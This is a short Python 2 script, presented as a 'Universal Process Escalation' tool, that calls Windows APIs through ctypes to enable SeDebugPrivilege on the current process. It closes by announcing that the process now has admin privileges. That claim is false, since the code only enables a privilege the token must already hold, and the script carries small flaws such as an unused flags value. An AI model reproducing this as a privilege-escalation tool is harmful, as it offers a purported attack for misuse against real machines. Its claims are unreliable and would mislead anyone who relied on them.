print "[+] Universal Process Escalation by op7ica@gmail.com"
print "[+] contact : op7ica@gmail.com"

from ctypes import windll
import ctypes
from ctypes import *

class TOKEN_PRIVS(ctypes.Structure):
    _fields_ = (
        ("PrivilegeCount",    ULONG),
        ("Privileges",        ULONG * 3 )
    )

def get_debug_privs():
    # Adjust Current TOKEN
    token = HANDLE()
    print "\t[+] Getting Current Token"
    flags =  40 #  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    windll.advapi32.OpenProcessToken(windll.kernel32.GetCurrentProcess(), 0x00000020, ctypes.byref(token))
    print "\t[+] Calculating Local SeDebugPrivilege"
    admin_priv_name = "SeDebugPrivilege" # we want this priv on the process
    pBytesReturned = ctypes.c_ulong() 
    windll.advapi32.LookupPrivilegeValueA(None,admin_priv_name,ctypes.byref(pBytesReturned))
    print "\t[+] Resolved SeDebugPrivilege as %d" % pBytesReturned.value
    print "\t[+] Modifying TOKEN Structure to enable Debug"
    privs = TOKEN_PRIVS()
    privs.PrivilegeCount = 1
    privs.Privileges = (pBytesReturned.value,0, 2) 
    print "\t[+] Adjusting Privileges of the current process"
    windll.advapi32.AdjustTokenPrivileges(token, 0, ctypes.byref(privs),0,0,0)
    print "\t[+] Closing current handle, almost done"
    windll.kernel32.CloseHandle(token)
    print "[+] Done, your process " , windll.kernel32.GetCurrentProcessId(), "has now admin privileges"
    ############ CURRENT TOKEN ADJUSTED ##################
	
get_debug_privs()